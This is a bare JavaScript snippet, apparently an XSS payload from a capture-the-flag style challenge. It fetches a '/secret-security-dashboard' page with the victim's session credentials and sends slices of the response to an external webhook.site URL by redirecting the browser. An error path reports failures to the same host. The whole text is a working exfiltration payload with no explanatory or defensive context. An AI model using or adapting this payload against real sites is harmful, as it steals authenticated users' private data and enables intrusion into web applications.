(async()=>{
  try{
    const hook='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';
    const r=await fetch('/secret-security-dashboard',{credentials:'include'});
    const t=await r.text();

    const parts = [
      'LEN=' + t.length,
      'HEAD=' + t.slice(0,1200),
      'MID=' + t.slice(Math.max(0, Math.floor(t.length/2)-600), Math.floor(t.length/2)+600),
      'TAIL=' + t.slice(Math.max(0,t.length-1200))
    ];

    location = hook + '?d=' + encodeURIComponent(parts.join('\n\n===\n\n'));
  }catch(e){
    location='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err='+encodeURIComponent(e.toString());
  }
})();